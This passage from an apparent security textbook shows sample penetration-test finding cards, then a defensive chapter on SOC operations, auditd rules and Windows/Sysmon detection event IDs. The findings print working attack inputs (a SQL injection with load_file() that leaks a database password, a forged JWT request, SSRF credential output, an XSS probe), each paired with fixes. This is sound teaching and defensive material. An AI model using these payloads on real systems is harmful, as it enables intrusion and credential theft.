The `id` query parameter in `/invoice_view.php` is concatenated directly into a raw SQL query executed via `mysqli_query()` without input type validation or prepared statement parameterization. Additionally, the MariaDB database user `portal_db_user` operates with global `FILE` privileges, enabling an unauthenticated attacker to execute `UNION SELECT` queries and invoke `LOAD_FILE()` to read sensitive configuration files from the underlying Linux filesystem.

#### Verification Evidence & Log Output
```http
GET /invoice_view.php?id=-1+UNION+SELECT+1,user(),database(),version(),5,load_file('/var/www/config/db.inc.php')--+- HTTP/1.1
Host: 10.10.140.25
User-Agent: Mozilla/5.0 (Security-Audit-Verification)

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8

<div class="invoice-box">
  <p>Employee: portal_db_user@localhost</p>
  <p>Department: corpbilling</p>
  <p>Amount: 10.6.18-MariaDB-0ubuntu0.22.04.1</p>
  <p>Notes: <?php $db_pass = "Pr0d_B1ll1ng#2025!Svc"; ... ?></p>
</div>
```

#### Concrete Code & Configuration Remediation
Replace string concatenation with PDO prepared statements (`PDO::ATTR_EMULATE_PREPARES => false`) and revoke global privileges from the database user:
```php
$invoice_id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if (!$invoice_id || $invoice_id < 1) { http_response_code(400); exit("Invalid ID"); }

$stmt = $pdo->prepare("SELECT invoice_num, employee_name, department, amount, status, notes FROM invoices WHERE id = :id LIMIT 1");
$stmt->execute([':id' => $invoice_id]);
$row = $stmt->fetch(PDO::FETCH_ASSOC);
```
```sql
REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'portal_db_user'@'localhost';
GRANT SELECT, INSERT, UPDATE ON corpbilling.invoices TO 'portal_db_user'@'localhost';
FLUSH PRIVILEGES;
```

---

### Finding Card 2: `FND-002` — JWT Algorithm Confusion (`RS256` to `HS256`) & GraphQL BOLA

| Attribute | Details |
| :--- | :--- |
| **Finding ID & Title** | `FND-002`: JWT Algorithm Confusion (`RS256` to `HS256`) & GraphQL BOLA |
| **Severity & CVSS v3.1** | **CRITICAL — 9.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| **CVSS v4.0 Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` (`9.3 Critical`) |
| **CWE & OWASP Mapping** | `CWE-347: Improper Verification of Cryptographic Signature` & `CWE-639: Authorization Bypass Through User-Controlled Key` / OWASP API Top 10 `API1:2023` & `API2:2023` |
| **Affected Asset** | `https://api.lnf.lk:4000/graphql` (`getUserProfile` resolver & `auth.js` middleware) |

#### Technical Description
1. The JWT verification middleware calls `jwt.verify(token, PUBLIC_KEY)` without specifying `algorithms: ['RS256']`. An attacker can retrieve the server's RSA public key from `/.well-known/public.pem` and sign an arbitrary token using `HS256` (HMAC-SHA256), treating the public key PEM string as the symmetric HMAC secret.
2. The `getUserProfile(accountId: ID!)` GraphQL resolver does not verify whether the authenticated caller's `sub` claim matches `accountId`, resulting in Broken Object Level Authorization (BOLA).

#### Verification Evidence & Log Output
```http
POST /graphql HTTP/1.1
Host: api.lnf.lk:4000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbi0wMDEiLCJyb2xlIjoiU1VQRVJfQURNSU4ifQ.<HMAC_WITH_RSA_PUBKEY>
Content-Type: application/json

{"query": "{ getUserProfile(accountId: \"10042\") { accountId email role apiKey } }"}

HTTP/1.1 200 OK
{"data": {"getUserProfile": {"accountId": "10042", "email": "cfo@lnf.lk", "role": "EXECUTIVE", "apiKey": "lnf_live_98a7bc6512ef"}}}
```

#### Concrete Code & Configuration Remediation
Enforce explicit asymmetric algorithm whitelisting and object ownership checks:
```javascript
// 1. Enforce RS256 in jwt.verify
const decoded = jwt.verify(token, PUBLIC_KEY, {
    algorithms: ['RS256'],
    issuer: 'https://auth.lnf.lk',
    audience: 'https://api.lnf.lk'
});

// 2. Enforce Object-Level Authorization in GraphQL Resolver
getUserProfile: async (_, { accountId }, context) => {
    if (!context.user) throw new AuthenticationError("Unauthenticated");
    if (String(context.user.sub) !== String(accountId) && context.user.role !== 'SUPER_ADMIN') {
        throw new ForbiddenError("Access denied to requested accountId");
    }
    return await db.users.findById(accountId);
}
```

---

### Finding Card 3: `FND-003` — Server-Side Request Forgery (SSRF) to Cloud IMDSv1 Metadata

| Attribute | Details |
| :--- | :--- |
| **Finding ID & Title** | `FND-003`: Server-Side Request Forgery (SSRF) to Cloud IMDSv1 Metadata |
| **Severity & CVSS v3.1** | **HIGH — 8.6** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`) |
| **CWE & OWASP Mapping** | `CWE-918: Server-Side Request Forgery (SSRF)` / OWASP Top 10 `A10:2021 - SSRF` |
| **Affected Asset** | `https://api.lnf.lk:4000/graphql` (`testWebhookEndpoint` mutation) & EC2 Instance `i-0a98bc7654321fedc` |

#### Technical Description
The `testWebhookEndpoint` GraphQL mutation fetches arbitrary user-supplied URLs from the backend container without validating the scheme, resolving the destination IP against RFC 1918 / link-local ranges (`169.254.169.254`), or disabling HTTP redirects. Because the underlying AWS EC2 host permits IMDSv1 (`http-tokens = optional`), the SSRF allows extraction of temporary IAM role credentials assigned to the compute node.

#### Verification Evidence & Log Output
```json
{
  "data": {
    "testWebhookEndpoint": {
      "statusCode": 200,
      "body": "{\"Code\":\"Success\",\"AccessKeyId\":\"ASIAW3...REDACTED...\",\"SecretAccessKey\":\"wJalrXUtnFEMI/...REDACTED...\"}"
    }
  }
}
```

#### Concrete Code & Configuration Remediation
1. Enforce **IMDSv2** with hop limit `1` on all EC2 instances:
```bash
aws ec2 modify-instance-metadata-options --instance-id i-0a98bc7654321fedc --http-tokens required --http-put-response-hop-limit 1
```
2. Validate resolved IP addresses against private, loopback, and link-local CIDR blocks prior to establishing any outbound socket connection.

---

### Finding Card 4: `FND-004` — Active Directory Tier-0 Escalation via `WriteDacl` & RC4 SPNs

| Attribute | Details |
| :--- | :--- |
| **Finding ID & Title** | `FND-004`: Active Directory Tier-0 Escalation via `WriteDacl` & RC4 SPNs |
| **Severity & CVSS v3.1** | **HIGH — 8.8** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) |
| **CWE & OWASP Mapping** | `CWE-269: Improper Privilege Management` & `CWE-326: Inadequate Encryption Strength` |
| **Affected Asset** | `DC01.corp.lnf.internal` (`CN=Domain Admins` DACL & `svc_mssql` user object) |

#### Technical Description
The `svc_mssql` service account is registered with a Service Principal Name (`MSSQLSvc/db01.corp.lnf.internal:1433`) supporting legacy RC4-HMAC (`0x17`) encryption and is a member of `CORP\Helpdesk_Tier2`. In turn, `CORP\Helpdesk_Tier2` holds explicit `WriteDacl` permissions on the `CN=Domain Admins` group object. Any authenticated domain user can request an RC4 TGS ticket for `svc_mssql`, recover its password offline, and modify the `Domain Admins` DACL to grant themselves full forest administrative rights.

#### Verification Evidence & Log Output
```text
IdentityReference     : CORP\Helpdesk_Tier2
ActiveDirectoryRights : WriteDacl, ReadControl
AccessControlType     : Allow
ObjectDN              : CN=Domain Admins,CN=Users,DC=corp,DC=lnf,DC=internal
```

#### Concrete Code & Configuration Remediation
Migrate `svc_mssql` to a Group Managed Service Account (`gMSA`) enforcing `AES256` encryption only, and purge the non-standard ACE from `Domain Admins`:
```powershell
$acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=corp,DC=lnf,DC=internal"
$acl.PurgeAccessRules((New-Object System.Security.Principal.NTAccount("CORP", "Helpdesk_Tier2")))
Set-Acl -Path "AD:\CN=Domain Admins,CN=Users,DC=corp,DC=lnf,DC=internal" -AclObject $acl
```

---

### Finding Card 5: `FND-005` — Database Race Condition (TOCTOU) in Voucher Redemption API

| Attribute | Details |
| :--- | :--- |
| **Finding ID & Title** | `FND-005`: Database Race Condition (TOCTOU) in Voucher Redemption API |
| **Severity & CVSS v3.1** | **HIGH — 8.1** (`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H`) |
| **CWE & OWASP Mapping** | `CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization` |
| **Affected Asset** | `https://pay.lnf.lk/api/v1/wallet/redeem-voucher` |

#### Technical Description
The `redeem_voucher` endpoint reads `voucher.is_redeemed` without acquiring a pessimistic database row lock (`SELECT ... FOR UPDATE`) or executing an atomic conditional `UPDATE ... WHERE is_redeemed = FALSE`. When 15 concurrent HTTP/2 requests are dispatched using single-packet synchronization, multiple worker threads evaluate `voucher.is_redeemed == False` before the first transaction commits, crediting the user's wallet multiple times for a single voucher.

#### Verification Evidence & Log Output
```text
[Req 00] HTTP 200: {"status": "redeemed", "new_balance": "50.00"}
[Req 01] HTTP 200: {"status": "redeemed", "new_balance": "100.00"}
...
[Req 10] HTTP 200: {"status": "redeemed", "new_balance": "550.00"}
[Req 11] HTTP 400: {"error": "Invalid or already redeemed voucher"}
```

#### Concrete Code & Configuration Remediation
Wrap the redemption operation inside `transaction.atomic()` with an atomic conditional `UPDATE` and SQL `F()` expression:
```python
with transaction.atomic():
    updated = Voucher.objects.filter(code=code, is_redeemed=False).update(
        is_redeemed=True, redeemed_by=request.user, redeemed_at=timezone.now()
    )
    if updated != 1:
        return Response({"error": "Voucher already redeemed"}, status=409)
    Wallet.objects.select_for_update().filter(user=request.user).update(balance=F('balance') + voucher.value)
```

---

### Finding Card 6: `FND-006` — Unsafe Java Native Deserialization on Inventory Sync Daemon

| Attribute | Details |
| :--- | :--- |
| **Finding ID & Title** | `FND-006`: Unsafe Java Native Deserialization on Inventory Sync Daemon |
| **Severity & CVSS v3.1** | **MEDIUM — 6.8** (`CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` — Internal VLAN Exposed) |
| **CWE & OWASP Mapping** | `CWE-502: Deserialization of Untrusted Data` / OWASP Top 10 `A08:2021` |
| **Affected Asset** | `http://10.10.140.110:9090/api/sync/batch` (`SyncServlet.java`) |

#### Technical Description
The internal inventory synchronization endpoint deserializes raw Java object streams (`0xACED0005`) using `ObjectInputStream.readObject()` without a JEP 290 `ObjectInputFilter`. Because `commons-collections4-4.0.jar` is present on the classpath, an attacker on the internal network can achieve Remote Code Execution as `svc_inventory`.

#### Verification Evidence & Log Output
```text
POST /api/sync/batch HTTP/1.1 -> Triggered java.util.HashMap + java.net.URL DNS resolution callback to audit listener 10.10.14.5:53.
```

#### Concrete Code & Configuration Remediation
Enforce a strict class allowlist via `ObjectInputFilter` before calling `readObject()`:
```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxdepth=5;maxrefs=100;maxbytes=65536;com.corp.inventory.dto.BatchSyncPayload;java.util.ArrayList;!*"
);
ois.setObjectInputFilter(filter);
```

---

### Finding Card 7: `FND-007` — Stored Cross-Site Scripting (XSS) & Missing CSP Header

| Attribute | Details |
| :--- | :--- |
| **Finding ID & Title** | `FND-007`: Stored Cross-Site Scripting (XSS) & Missing Content Security Policy |
| **Severity & CVSS v3.1** | **MEDIUM — 6.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`) |
| **CWE & OWASP Mapping** | `CWE-79: Improper Neutralization of Input During Web Page Generation` |
| **Affected Asset** | `https://pay.lnf.lk/merchant/disputes` (`disputes.html`) |

#### Technical Description
Customer dispute reason strings are rendered in the merchant portal template using Django's `{{ dispute.reason|safe }}` filter, bypassing HTML entity encoding. Furthermore, the application does not emit a `Content-Security-Policy` header, permitting inline script execution in the browser context of authenticated merchant reviewers.

#### Verification Evidence & Log Output
Submitting `<svg onload="console.log(document.domain)">` in a test dispute note resulted in unescaped DOM rendering inside `/merchant/disputes`.

#### Concrete Code & Configuration Remediation
Remove the `|safe` filter (`{{ dispute.reason }}`) so all output is contextually HTML-encoded by default, and configure a strict nonce-based `Content-Security-Policy` header in Nginx:
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-$request_id'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';" always;
```

---

### Finding Card 8: `FND-008` — Exposed `.git` Repository & Verbose Server Banner Headers

| Attribute | Details |
| :--- | :--- |
| **Finding ID & Title** | `FND-008`: Exposed `.git` Repository & Verbose Server Banner Headers |
| **Severity & CVSS v3.1** | **LOW — 3.7** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N`) |
| **CWE & OWASP Mapping** | `CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere` / `A05:2021 - Security Misconfiguration` |
| **Affected Asset** | `http://10.10.140.125/.git/config` |

#### Technical Description
The web root `/var/www/analytics-hub` contains the `.git` metadata directory, which is accessible over HTTP without authentication, and Nginx emits version banners (`Server: nginx/1.18.0 (Ubuntu)`).

#### Verification Evidence & Log Output
```bash
$ curl -s http://10.10.140.125/.git/HEAD
ref: refs/heads/main
```

#### Concrete Code & Configuration Remediation
Remove `.git` directories from production build artifacts and configure Nginx to deny access to hidden dotfiles and suppress version headers:
```nginx
server_tokens off;
location ~ /\.(?!well-known).* {
    deny all;
    return 404;
}
```

---

## 52.6 Strategic Remediation Roadmap (30 / 60 / 90-Day Execution Plan)

| Phase & Horizon | Target Findings | Engineering & Architectural Deliverables | Verification KPI |
| :--- | :--- | :--- | :--- |
| **Phase 1: Immediate Tactical Containment (Days 1–30)** | `FND-001`, `FND-002`, `FND-004` (ACL), `FND-005` | 1. Refactor `/invoice_view.php` to PDO prepared statements and revoke MariaDB `FILE` privilege.<br>2. Pin `algorithms: ['RS256']` in JWT middleware and add ownership checks to GraphQL resolvers.<br>3. Purge `Helpdesk_Tier2` `WriteDacl` ACE from `Domain Admins`.<br>4. Add `SELECT ... FOR UPDATE` and atomic conditional updates to `/api/v1/wallet/redeem-voucher`. | 100% of Critical and High business-logic flaws verified closed via retest. |
| **Phase 2: Structural & Cloud Hardening (Days 31–60)** | `FND-003`, `FND-004` (gMSA), `FND-006`, `FND-007`, `FND-008` | 1. Enforce AWS IMDSv2 (`http-tokens=required`, hop limit `1`) across all EC2 instances and deploy outbound SSRF IP filtering.<br>2. Migrate all SPN service accounts (`svc_mssql`) to `gMSA` with AES-256 encryption.<br>3. Apply JEP 290 `ObjectInputFilter` on Java services.<br>4. Remove `|safe` template filters, deploy nonce-based CSP headers, and block `/.git` in Nginx. | Zero legacy RC4 service tickets (`Event ID 4769` `0x17`) observed in SIEM; zero IMDSv1 calls permitted. |
| **Phase 3: Governance, CI/CD Gates & Purple Team Assurance (Days 61–90)** | Enterprise-Wide Defense-in-Depth | 1. Enforce Active Directory Tiered Administration (`Tier 0/1/2`) and `Protected Users` group.<br>2. Integrate `Semgrep` (SAST), `Gitleaks` (secret scanning), and hash-pinned dependencies into CI/CD.<br>3. Deploy Sysmon v15 + Wazuh/Splunk Sigma detection rules and conduct a verification Purple Team exercise. | Automated CI/CD security gates active on 100% of repositories; Mean Time to Detect (MTTD) < 5 minutes. |

---

# CHAPTER 53: DEFENSIVE ENGINEERING, BLUE TEAM SIEM/SOC & PURPLE TEAMING

Modern enterprise defense requires engineering verifiable telemetry pipelines, behavioral detection logic, and rapid incident containment workflows. This chapter serves as a complete reference manual for Security Operations Center (SOC) architecture, Linux and Windows host telemetry engineering, and detection rule authoring across **Sigma**, **YARA**, and **Suricata/Snort**.

---

## 53.1 Security Operations Center (SOC) Architecture & Workflows

### 53.1.1 Functional Tiers of a Modern Enterprise SOC

```
[ Telemetry Sources: Sysmon / auditd / EDR / Firewall / CloudTrail / AD ]
                                   │
                                   ▼
         [ Log Shippers & Normalizers (Vector / Filebeat / Wazuh) ]
                                   │
                                   ▼
   [ SIEM & Data Lake (Splunk / Elastic / Sentinel / Chronicle) + SOAR ]
                                   │
       ┌───────────────────────────┼───────────────────────────┐
       ▼                           ▼                           ▼
[ Tier 1: Triage ]       [ Tier 2: Incident ]        [ Tier 3: Hunt & ]
  Alert Validation         Deep Forensics &            Detection Eng,
  Enrichment & SLA         Scope Containment           Malware RevEng,
  (<15 min MTTA)           Root Cause Analysis         Purple Teaming
```

| SOC Role / Tier | Primary Responsibilities | Key Tooling & Artifacts | Key Performance Indicators (KPIs) |
| :--- | :--- | :--- | :--- |
| **Tier 1: Triage & Monitoring Analyst** | Continuous queue monitoring, initial alert triage, IOC enrichment, false-positive filtering, ticket escalation, and running standard SOAR containment playbooks. | SIEM Dashboards, TheHive/Cortex, VirusTotal/MISP, SOAR Playbooks. | **MTTA** (Mean Time to Acknowledge < 10 min), False Positive Escalation Rate (< 10%). |
| **Tier 2: Incident Responder & Forensics Analyst** | Deep-dive investigation of escalated incidents, timeline reconstruction across multi-host telemetry, host memory/disk forensics, lateral movement scoping, and active containment. | Velociraptor, Volatility 3, Eric Zimmerman Tools, Hayabusa/Chainsaw, Wireshark. | **MTTC** (Mean Time to Contain < 45 min), Scope Completeness Accuracy. |
| **Tier 3: Threat Hunter & Detection Engineer** | Hypothesis-driven proactive threat hunting (assuming breach), authoring/tuning Sigma, YARA, and Suricata rules, reverse-engineering novel malware samples, and leading Purple Team exercises. | Jupyter Notebooks, Sigma CLI (`sigmac`/`pySigma`), YARA, Ghidra/x64dbg, Atomic Red Team. | Detection Coverage across MITRE ATT&CK, Alert Fidelity (True Positive Ratio > 85%). |
| **SOC Manager / Incident Commander** | Crisis coordination, legal/regulatory breach notification (Sri Lanka CERT\|CC, CBSL FinCSIRT, PDPA Data Protection Authority), executive briefings, and post-incident lessons learned. | NIST SP 800-61r2 / SANS PICERL Playbooks, Crisis Communications Matrix. | **MTTR** (Mean Time to Recover), SLA Compliance, Audit Readiness. |

### 53.1.2 Incident Response Lifecycle (SANS PICERL & NIST SP 800-61r2)
1. **Preparation:** Asset inventory, centralized NTP time synchronization (UTC), Sysmon/`auditd` baseline deployment, immutable log retention (minimum 180 days hot, 1 year cold), and out-of-band communication channels.
2. **Identification (Detection & Analysis):** Alert correlation, establishing the **Patient Zero** host, entry vector (`Initial Access`), executing identity, and Blast Radius across the network.
3. **Containment:**
   - *Short-Term Containment:* EDR network isolation of affected endpoints, disabling compromised AD accounts, blocking C2 IPs/domains at the perimeter firewall/DNS sinkhole, while **preserving volatile RAM** prior to rebooting.
   - *Long-Term Containment:* Applying emergency firewall segmentation rules, rotating `krbtgt` twice (if Tier-0 compromise is suspected), and re-homing clean services.
4. **Eradication:** Removing persistence mechanisms (scheduled tasks, WMI event subscriptions, rogue Windows services, unauthorized SSH keys, golden/silver tickets), patching the root-cause vulnerability, and rebuilding compromised hosts from gold images.
5. **Recovery:** Restoring data from verified immutable backups, monitoring reconnected systems under heightened SIEM scrutiny, and validating business functionality.
6. **Lessons Learned (Post-Incident Review):** Conducting a blameless post-mortem within 5 business days, publishing an internal timeline report, and translating every gap into new Sigma/YARA/EDR detections.

---

## 53.2 Linux Telemetry & Audit Engineering (`auditd`, `syslog`, `auth.log`)

### 53.2.1 Linux Kernel Audit Subsystem (`auditd`) Architecture
Unlike standard `syslog` (which relies on user-space applications voluntarily logging events), the Linux Audit Daemon (`auditd`) hooks directly into the **Linux kernel syscall interface** via netlink sockets. Even if an attacker modifies user-space binaries or clears `~/.bash_history`, kernel-level `execve`, `openat`, `ptrace`, and `setuid` syscalls are captured before user-space return.

#### Production `/etc/audit/rules.d/99-enterprise-security.rules`
```text
# Delete all existing rules and set kernel backlog buffer size
-D
-b 16384
# Failure mode: 1 = printk (log to kernel ring buffer), 2 = panic
-f 1

# 1. Monitor Process Execution (MITRE T1059 - Command and Scripting Interpreter)
-a always,exit -F arch=b64 -S execve -S execveat -k process_exec
-a always,exit -F arch=b32 -S execve -S execveat -k process_exec

# 2. Monitor Identity & Credential File Modifications (MITRE T1098 / T1136)
-w /etc/passwd -p wa -k identity_tamper
-w /etc/shadow -p wa -k identity_tamper
-w /etc/group -p wa -k identity_tamper
-w /etc/gshadow -p wa -k identity_tamper
-w /etc/sudoers -p wa -k sudoers_modification
-w /etc/sudoers.d/ -p wa -k sudoers_modification

# 3. Monitor SSH Configuration & Authorized Keys Persistence (MITRE T1098.004)
-w /etc/ssh/sshd_config -p wa -k sshd_config_mod
-w /root/.ssh/ -p wa -k root_ssh_keys

# 4. Monitor Cron & Systemd Persistence Mechanisms (MITRE T1053.003 / T1543.002)
-w /etc/crontab -p wa -k cron_persistence
-w /etc/cron.d/ -p wa -k cron_persistence
-w /var/spool/cron/crontabs/ -p wa -k cron_persistence
-w /etc/systemd/system/ -p wa -k systemd_persistence

# 5. Monitor Kernel Module Loading & Process Injection (MITRE T1547.006 / T1055)
-a always,exit -F arch=b64 -S init_module -S finit_module -S delete_module -k kernel_modules
-a always,exit -F arch=b64 -S ptrace -F a0=0x10 -k process_injection

# Make the audit configuration immutable until next reboot (requires reboot to alter rules)
-e 2
```

#### Analyzing `auditd` Telemetry with `ausearch` and `aureport`
When `auditd` logs an `EXECVE` event to `/var/log/audit/audit.log`, it splits the event across three records sharing a common timestamp and serial number (`msg=audit(1730542890.412:8941)`):
- `type=SYSCALL`: Contains `uid`, `euid`, `gid`, `exe` (binary path), `ppid` (parent PID), `comm` (command name), `tty`, and `key`.
- `type=EXECVE`: Contains `argc` and each argument (`a0`, `a1`, `a2` — hex-encoded if arguments contain spaces or special characters).
- `type=PATH`: Contains inode, permissions (`mode`), and owner (`ouid`/`ogid`) of the target file.

```bash
# Search all process executions tagged with 'process_exec' and decode hex arguments (-i)
$ ausearch -k process_exec -i

# Generate a summary report of all failed authentication events and anomaly syscalls
$ aureport --auth --failed --summary
$ aureport -x --summary
```

### 53.2.2 Linux Authentication & System Logs (`/var/log/auth.log` / `/var/log/secure`)
| Log File Path | Distro Family | High-Value Security Telemetry |
| :--- | :--- | :--- |
| `/var/log/auth.log` | Debian / Ubuntu | `sshd` accepted/failed logins, public key fingerprints, `sudo` command invocations, PAM module failures, `su` session openings, `useradd`/`usermod`. |
| `/var/log/secure` | RHEL / Rocky / Alma | Equivalent to `/var/log/auth.log` on Red Hat Enterprise Linux derivatives. |
| `/var/log/wtmp` & `btmp` | All Linux (Binary) | Successful logins (`last -f /var/log/wtmp`) and failed login attempts (`lastb -f /var/log/btmp`). |
| `/var/log/syslog` / `messages` | All Linux | Service crashes (`segfault`), `ufw`/`nftables` dropped packet kernel logs, cron job starts (`CRON[pid]: (root) CMD (...)`). |

---

## 53.3 Windows Event Logs & Sysmon Telemetry Reference

### 53.3.1 Critical Windows Security & System Event IDs

| Event ID | Log Channel | Event Description | Forensic & Detection Significance |
| :--- | :--- | :--- | :--- |
| **`4624`** | Security | **An account was successfully logged on** | Inspect `LogonType`, `TargetUserName`, `IpAddress`, `WorkstationName`, and `AuthenticationPackageName` (`NTLM` vs `Kerberos`). |
| **`4625`** | Security | **An account failed to log on** | Detects password spraying, brute-force, and user enumeration. Inspect `SubStatus` (`0xC0000064` = Non-existent user, `0xC000006A` = Wrong password, `0xC0000234` = Account locked out). |
| **`4648`** | Security | **A logon was attempted using explicit credentials** | Generated by `runas.exe`, `PsExec`, PowerShell `Invoke-Command -Credential`, or pass-the-hash/token manipulation. |
| **`4672`** | Security | **Special privileges assigned to new logon** | Indicates an administrative logon granting sensitive privileges (`SeDebugPrivilege`, `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`). |
| **`4688`** | Security | **A new process has been created** | Native process creation log. Requires GPO **"Include command line in process creation events"** enabled to populate `CommandLine` and `ParentProcessName`. |
| **`4697`** | Security | **A service was installed in the system** | Security-channel counterpart to System Event `7045`. Captures `ServiceName`, `ServiceFileName`, `ServiceType`, `ServiceStartType`, and installing user SID. |
| **`4698`** | Security | **A scheduled task was created** | Captures the full XML task definition (`TaskContent`), command arguments, and executing context (`T1053.005`). *(Also see `4699` deleted, `4700` enabled, `4702` updated).* |
| **`4720`** | Security | **A user account was created** | Detects unauthorized local or domain backdoor account creation (`T1136`). |
| **`4732`** | Security | **A member was added to a security-enabled local group** | Detects privilege escalation via adding an account to local `Administrators` or `Remote Desktop Users` (`4728` = Global group, `4756` = Universal group). |
| **`4768`** | Security | **A Kerberos authentication ticket (TGT) was requested** | Detects AS-REP Roasting (`PreAuthType = 0`, `TicketEncryptionType = 0x17`) and Overpass-the-Hash / Golden Ticket anomalies. |
| **`4769`** | Security | **A Kerberos service ticket (TGS) was requested** | Primary detection source for **Kerberoasting**: filter for `TicketEncryptionType = 0x17` (RC4) and `ServiceName` not ending in `$` or `krbtgt`. |
| **`4776`** | Security | **The computer attempted to validate the credentials for an account (NTLM)** | Logged on the Domain Controller (or local SAM host) during NTLM authentication. Error `0xC000006A` indicates failed NTLM password validation. |
| **`5140`** | Security | **A network share object was accessed** | Detects SMB lateral movement (`\\*\ADMIN$`, `\\*\C$`, `\\*\IPC$`) and BloodHound/SharpHound share enumeration (`5145` provides granular relative path ACL checks). |
| **`7045`** | System | **A service was installed in the system** | Primary System log indicator for `PsExec` (`PSEXESVC`), `smbexec`, service persistence, and kernel driver loading. |

### 53.3.2 Complete Reference of Windows Event ID `4624` Logon Types

| Logon Type | Name | Technical Trigger & Attack/Forensic Context |
| :--- | :--- | :--- |
| **`Type 2`** | **Interactive** | Physical console login, KVM/iLO console, or local `RunAs` session. |
| **`Type 3`** | **Network** | SMB share access (`\\server\share`), RPC, WMI, `PsExec` network authentication, WinRM (`5985`/`5986`). Cleartext credentials are **not** cached in LSASS on the target. |
| **`Type 4`** | **Batch** | Scheduled Task execution running under stored user credentials. |
| **`Type 5`** | **Service** | Windows Service startup (`services.exe`) running under a configured service account. |
| **`Type 7`** | **Unlock** | Workstation screen unlock from an existing interactive session. |
| **`Type 8`** | **NetworkCleartext** | Network logon where plaintext password was transmitted/validated (e.g., IIS Basic Authentication). Caches credentials in LSASS. |
| **`Type 9`** | **NewCredentials** | Created by `runas /netonly` or `LogonUserW(..., LOGON32_LOGON_NEW_CREDENTIALS)`. Local identity remains unchanged, but outbound network connections use the supplied credentials (common in **Pass-the-Hash** / `sekurlsa::pth`). |
| **`Type 10`** | **RemoteInteractive** | Remote Desktop Protocol (**RDP** / Terminal Services) graphical session (`3389/tcp`). |
| **`Type 11`** | **CachedInteractive** | Domain user logging onto a laptop/workstation using cached domain credentials (`mscash2` / DCC2) when no Domain Controller is reachable. |

### 53.3.3 Complete Sysmon Event IDs Reference (`Event IDs 1 – 26`)
`Sysinternals Sysmon` (`Microsoft-Windows-Sysmon/Operational`) installs a kernel device driver (`SysmonDrv.sys`) and user-mode service (`Sysmon.exe` / `Sysmon64.exe`) that enriches host activity with cryptographic hashes (`SHA256`, `IMPHASH`), process GUIDs, parent command lines, and memory/registry telemetry.

| Sysmon Event ID | Event Tag Name | Technical Description & Primary Detection Use Case |
| :--- | :--- | :--- |
| **`Event ID 1`** | `ProcessCreate` | Logs every process creation with full `CommandLine`, `ParentImage`, `ParentCommandLine`, `Hashes` (`SHA256`, `IMPHASH`), `IntegrityLevel`, and `ProcessGuid`. |
| **`Event ID 2`** | `FileCreateTime` | Detects **Timestomping** (`T1070.006`) when a process explicitly modifies a file's creation timestamp (`CreationUtcTime` vs `PreviousCreationUtcTime`). |
| **`Event ID 3`** | `NetworkConnect` | Maps TCP/UDP socket connections (`SourceIp`, `DestinationIp`, `DestinationPort`) directly to the initiating `ProcessId` and `Image` path. |
| **`Event ID 4`** | `SysmonServiceStateChange` | Logs when the Sysmon service itself starts or stops (detects tampering). |
| **`Event ID 5`** | `ProcessTerminate` | Logs process termination (`ProcessGuid`, `Image`), useful for timeline correlation or detecting EDR killer tools. |
| **`Event ID 6`** | `DriverLoad` | Logs kernel driver (`.sys`) loads with `SHA256` and `Signature`/`SignatureStatus`. Essential for detecting **BYOVD (Bring Your Own Vulnerable Driver)** attacks. |
| **`Event ID 7`** | `ImageLoad` | Logs DLL loads into processes. Critical for detecting **DLL Side-Loading**, **DLL Search Order Hijacking**, and unmanaged PowerShell (`System.Management.Automation.ni.dll` loaded into non-PowerShell processes). |
| **`Event ID 8`** | `CreateRemoteThread` | Detects a process creating a thread inside another process (`CreateRemoteThread`), indicative of **Process Injection** (`T1055`), Cobalt Strike `shinject`, or `Mimikatz`. |
| **`Event ID 9`** | `RawAccessRead` | Detects raw sector reads of `\\.\PhysicalDrive0` or volume handles bypassing NTFS ACLs (e.g., offline extraction of `NTDS.dit` or `SAM` hives via `NinjaCopy`). |
| **`Event ID 10`** | `ProcessAccess` | Detects one process opening a handle (`OpenProcess`) to another process. Essential for detecting **LSASS Credential Dumping** (`TargetImage = C:\Windows\system32\lsass.exe`). |
| **`Event ID 11`** | `FileCreate` | Logs file creations or overwrites. Monitored for dropped executables, scripts (`.ps1`, `.vbs`, `.bat`), web shells (`.aspx`, `.ashx`), and Startup folder items. |
| **`Event ID 12`** | `RegistryEvent (Create/Delete)` | Logs creation or deletion of registry keys/values (`Run`/`RunOnce`, `Services`, `Image File Execution Options`, `COM` hijacking). |
| **`Event ID 13`** | `RegistryEvent (Value Set)` | Logs modifications to registry values, capturing the exact data written (`Details` field). |
| **`Event ID 14`** | `RegistryEvent (Key/Value Rename)` | Logs renaming of registry keys or values (used in hidden registry persistence). |
| **`Event ID 15`** | `FileCreateStreamHash` | Detects creation of **NTFS Alternate Data Streams (ADS)** and captures the `Zone.Identifier` (`Mark-of-the-Web` URL origin of downloaded payloads). |
| **`Event ID 16`** | `SysmonConfigChange` | Logs changes to the active Sysmon XML configuration hash (detects attacker blinding of Sysmon rules). |
| **`Event ID 17`** | `PipeEvent (Pipe Created)` | Logs creation of Named Pipes (`\\.\pipe\*`). Detects default/malleable C2 named pipes (`msagent_*`, `postex_*`, `mojo.*`) and privilege escalation tools (`PrintSpoofer`). |
